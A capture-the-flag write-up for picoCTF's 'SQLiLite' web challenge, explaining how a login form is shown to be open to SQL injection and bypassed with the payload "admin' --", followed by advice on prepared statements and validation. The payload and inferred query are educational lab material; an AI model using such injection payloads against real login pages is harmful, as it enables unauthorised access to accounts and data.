# 🧩 Challenge: SQLiLite

**Category:** Web Exploitation  
**Difficulty:** Medium  
**Platform:** picoCTF  

---

## 🧪 Description

Can you login to this website?

The challenge provides a simple login page.  
The goal is to log in as the **admin** user and retrieve the hidden flag.

## 🔍 Vulnerability Analysis

The website only exposes a login form (username and password), so the first step is to test for SQL Injection.

Test payload:

username: '  
password: '

Submitting this input results in a database error, which indicates that user input is directly concatenated into an SQL query without proper sanitization.

From the error message, the backend SQL query appears to be:

SELECT * FROM users WHERE name='[username]' AND password='[password]'

This confirms that the application is vulnerable to SQL Injection.

---

## ❗ Limitation

- No input validation or sanitization
- No prepared statements
- Password verification relies entirely on SQL query logic

---

## 🛠️ Exploitation Strategy

Since the target user is **admin**, the SQL query can be manipulated using a comment.

Payload used:

username: admin' --  
password: anything

Resulting SQL query:

SELECT * FROM users WHERE name='admin' --' AND password='anything'

The `--` comments out the rest of the query, bypassing the password check.

After successfully logging in, the flag is not displayed directly but can be found by viewing the page source.

## 🛡️ How to Fix

To prevent this vulnerability, the application should implement:

- Prepared statements (parameterized queries)
- Proper input validation and escaping
- Avoid exposing raw SQL error messages
- Secure password handling using hashing
